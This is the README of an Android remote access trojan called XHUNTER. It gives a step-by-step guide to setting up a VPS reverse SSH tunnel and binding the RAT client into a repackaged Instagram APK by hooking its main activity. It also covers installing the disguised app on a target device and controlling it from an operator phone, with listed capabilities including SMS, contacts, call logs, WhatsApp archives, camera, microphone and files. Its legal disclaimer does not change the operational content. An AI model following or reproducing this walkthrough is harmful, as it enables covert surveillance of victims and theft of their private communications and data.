<div id="top"></div>

<!-- PROJECT SHIELDS -->
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![MIT License][license-shield]][license-url]
[![Last Commit][last-commit-shield]][last-commit-url]
[![Repo Size][repo-size-shield]][repo-size-url]

<br />

<!-- PROJECT LOGO -->
<div align="center">
  <a href="https://github.com/anirudhmalik/xhunter">
    <img src="images/logo.png" alt="XHUNTER" width="300" height="300">
  </a>

  <h3 align="center">XHUNTER</h3>

  <p align="center">
    Android research / admin tooling (v2 <strong>demo</strong> distribution) · RAT for Android 💀
    <br />
    <a href="https://github.com/anirudhmalik/xhunter/releases">View release</a>
    ·
    <a href="https://github.com/anirudhmalik/xhunter/issues">Report bug</a>
    ·
    <a href="https://github.com/anirudhmalik/xhunter/issues">Request feature</a>
  </p>
</div>

## Legal disclaimer: educational / authorized use only

Use of **XHUNTER** against people or systems **without** clear **authorization** is **illegal** in most jurisdictions. You must comply with all applicable laws. The authors are **not** liable for misuse. Use only on systems you own or are explicitly permitted to test. The in-app **About** / legal text applies in addition to this section.

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ABOUT THE PROJECT -->
## About the project (v2 demo)

**v2** is a new model vs older single-APK flows (e.g. `xhunter_1.6`–style all-in-one builds). Legacy in-app *build* flows were removed; the main repo is [anirudhmalik/xhunter](https://github.com/anirudhmalik/xhunter). This README focuses on:

* A **host app** for your **operator** phone: **`xhunter-demo.apk`** (SSH **reverse** tunnel, client list, v2.0 **demo** badge in the UI).
* A **desktop binder** in **`binder/`** (Bash + Java JAR): merge the **client** into a **host APK** (e.g. Instagram). Binding on-device is not practical — use a PC.
* A **VPS** (or similar) for reachability, **port / SSH** setup, and a **`HOST`** value shared by the binder and the app.

[Demo vs pro](#features-demo-vs-pro) lists what the current demo build allows vs a future **pro**-style build.

**Optional `config.txt` reference:** [binder/BINDER.md](binder/BINDER.md)

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting started

### Prerequisites

* **Android** device(s) — one for the **host / operator** app, one for the **merged** (test) app  
* **Internet** and a **VPS** (or cloud VM) you control  
* **PC:** macOS, Linux, or **Windows** with **Git Bash** or **WSL** (for the binder)  
* **JDK** on the PC (the binder’s `setup.sh` checks for `java`)

---

### 1) VPS and SSH reverse port forwarding

You need a **reachable server** and forwarding so a device running the merged app can use a **reverse SSH tunnel**. Use the same **server address** in the app and as **`HOST`** in `binder/config.txt` (`remote_server_ip` or DNS).

#### 1.1 — Cloud server and SSH access

* Spin up **Ubuntu** on a VPS or **EC2** (or similar). In the security group / firewall, allow what you need (often **22** and forwarded ports, e.g. **8080** on the server side for this flow).
* Log in, for example:

  ```bash
  ssh -i your_key.pem ubuntu@<remote_server_ip>
  ```

  On some AMIs the user is **`ec2-user`** instead of **`ubuntu`**.

* Optional: `sudo passwd ubuntu` (or your user).

#### 1.2 — `sshd_config`: `GatewayPorts` and password auth

**Security note:** password SSH and `GatewayPorts` are convenient for this write-up; lock down and prefer keys in production. Only on **your** server.

1. Edit `/etc/ssh/sshd_config` (or a drop-in under `sshd_config.d/`):
   * **`GatewayPorts no` → `yes`**
   * If you use password login: **`PasswordAuthentication no` → `yes`**
2. Restart SSH:

   ```bash
   sudo systemctl restart ssh
   ```

   (Some distros use the `sshd` unit name.)

3. In **Xhunter** (with `xhunter-demo.apk`), set **host**, **user**, **password** (and ports) to match. After the tunnel is up, use the same **public IP** as **`HOST`** when building a merged client.

*Reverse* SSH: the device dials **out** to the server; the path is configured so the **host app** can accept the client. Exact ports are shown in the app.

---

### 2) Binder: merge the client into a host APK (demo: Instagram)

1. **Clone** the [xhunter](https://github.com/anirudhmalik/xhunter) repository, then go into the **`binder/`** directory at the repo root:

   ```bash
   git clone https://github.com/anirudhmalik/xhunter.git
   cd xhunter
   cd binder
   ```

   You should see `setup.sh` and `config.txt` here, with `xhunter-demo.apk` in the **parent** directory (`..` from `binder`). *If you cloned to a custom folder name, `cd` into that folder before `cd binder`.*

2. **One time:**

   ```bash
   chmod +x setup.sh binder.sh
   ./setup.sh
   ```

3. Edit **`config.txt`:** set **`HOST`** to your **VPS IP**. The sample line **`HOST_APK=apps/instagram.apk`** expects a file at **`binder/apps/instagram.apk`**. This repo’s **`binder/apps/`** folder does **not** ship a host APK — obtain one yourself (e.g. download the Instagram Android APK, then save it as `instagram.apk` in `binder/apps/`). Example third-party link (use at your own risk; not affiliated): [download Instagram APK (Softonic)](https://instagram.en.softonic.com/android/download?ex=MATE-1430.0&rex=true). You can set **`HOST_APK`** to any path; see [binder/BINDER.md](binder/BINDER.md) for optional keys.

4. Run (real terminal, not a pipe):

   ```bash
   ./binder.sh
   ```
   <img width="750" height="482" alt="scren" src="https://github.com/user-attachments/assets/e8d44b08-e4ac-490a-b386-04541053b5d0" />


5. At the **hook** prompt, choose the line for **`InstagramMainActivity`** (example: index **13** — **your numbers will differ**):

   ```text
   Choose activity for Payload.start hook (up to 20 shown; use --hook-list-max to list more. ★ = MAIN/LAUNCHER):
   …
    13)    com.instagram.mainactivity.InstagramMainActivity
   …
   Enter number (1-20) or q: 13
   ```
   <img width="498" height="327" alt="screenshot" src="https://github.com/user-attachments/assets/c8cee71c-82b7-43f7-836c-78cba9a21206" />


6. Wait until merge, rebuild, and sign finish.

7. **Output:** `binder/out/xhunter-merged.apk` (unless you set **`OUT_APK`**).

8. Install that APK on the **test** device. The client often **connects only after** the user **opens the app**, **signs in** if required, and reaches the **home** screen.

9. On the **operator** phone, install **`xhunter-demo.apk`** from the parent folder (`../xhunter-demo.apk`), enter **SSH** credentials, **start the tunnel**, wait for the client in the list. Details: [§3 below](#operator-app).

---

<p id="operator-app"></p>

### 3) Install `xhunter-demo.apk` — operator app

* Install **`xhunter-demo.apk`** (if **unknown sources** is blocked, your device vendor explains how to allow installs — e.g. [side-loading help](https://www.maketecheasier.com/install-apps-from-unknown-sources-android)).
* **Android 13+:** allow **notifications** for the tunnel foreground service if asked.
* Open the app: **SSH** host, user, password, **ports** as shown; **save** a profile if you like; **start** the tunnel. When a merged device connects, it appears in the **client list**; in the **demo**, most modules show **Pro only** (see [Features](#features-demo-vs-pro)).
* **v2.0 demo** badge, **Settings**, **About**, and in-app **legal** text.

<p align="right">(<a href="#top">back to top</a>)</p>

## Files in this tree (expect)

| Item | Role |
|------|------|
| `README.md` | This file |
| `images/logo.png` | Branding (referenced above) |
| `xhunter-demo.apk` | Operator phone (host / SSH UI) |
| `binder/apps/` | No host APK shipped — add your own file to match `HOST_APK` in `config.txt` |
| `binder/` (rest) | `setup.sh`, `binder.sh`, `config.txt`, `vendor/`, etc. |
| [binder/BINDER.md](binder/BINDER.md) | `config.txt` reference |

Re-run **`binder/setup.sh`** if the checker complains about missing files.

<p align="right">(<a href="#top">back to top</a>)</p>

## Features: demo vs pro

| Area | v2.0 **demo** (this distribution) | **Pro** (planned) |
|------|-----------------------------------|-------------------|
| Device list & **device info** / refresh | Yes | Yes |
| **File explorer** | Pro-only / locked in demo | Yes |
| **WhatsApp** archive, **installed apps** | Pro-only in demo | Yes |
| **SMS** / **send SMS** | Pro-only in demo | Yes |
| **Contacts** / **call log** | Pro-only in demo | Yes |
| **Camera** / **mic** / **clipboard** | Pro-only in demo | Yes |

VPS + binder process is the same; **pro** is about what the **host** build enables remotely.

**Historical v1.6-style** all-in-APK workflow (in-app *build & bind*) is replaced here by the **desktop binder** + **SSH** path above.

<p align="right">(<a href="#top">back to top</a>)</p>

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request, or open an issue with the tag `enhancement`. Don’t forget to give the project a star.

1. Fork the project  
2. Create a feature branch (`git checkout -b feature/YourFeature`)  
3. Commit your changes (`git commit -m 'Add some feature'`)  
4. Push to the branch (`git push origin feature/YourFeature`)  
5. Open a pull request  

<p align="right">(<a href="#top">back to top</a>)</p>

## Credits

* [Apktool](https://github.com/iBotPeaches/Apktool) — APK decode / build in the desktop binder  
* [JSch](https://github.com/is/jsch) — SSH (common stack for Android + Java)  

## License

Distributed under the **MIT License** where `LICENSE` or `LICENSE.md` is present. If your copy does not include it yet, use the [upstream](https://github.com/anirudhmalik/xhunter) license as reference.

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- MARKDOWN LINKS & IMAGES -->
[contributors-shield]: https://img.shields.io/github/contributors/anirudhmalik/xhunter.svg?style=for-the-badge
[contributors-url]: https://github.com/anirudhmalik/xhunter/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/anirudhmalik/xhunter.svg?style=for-the-badge
[forks-url]: https://github.com/anirudhmalik/xhunter/network/members
[stars-shield]: https://img.shields.io/github/stars/anirudhmalik/xhunter.svg?style=for-the-badge
[stars-url]: https://github.com/anirudhmalik/xhunter/stargazers
[issues-shield]: https://img.shields.io/github/issues/anirudhmalik/xhunter.svg?style=for-the-badge
[issues-url]: https://github.com/anirudhmalik/xhunter/issues
[license-shield]: https://img.shields.io/github/license/anirudhmalik/xhunter.svg?style=for-the-badge
[license-url]: https://github.com/anirudhmalik/xhunter/blob/master/LICENSE.md
[last-commit-shield]: https://img.shields.io/github/last-commit/anirudhmalik/xhunter.svg?style=for-the-badge
[last-commit-url]: https://github.com/anirudhmalik/xhunter/commits/master
[repo-size-shield]: https://img.shields.io/github/repo-size/anirudhmalik/xhunter.svg?style=for-the-badge
[repo-size-url]: https://github.com/anirudhmalik/xhunter/releases
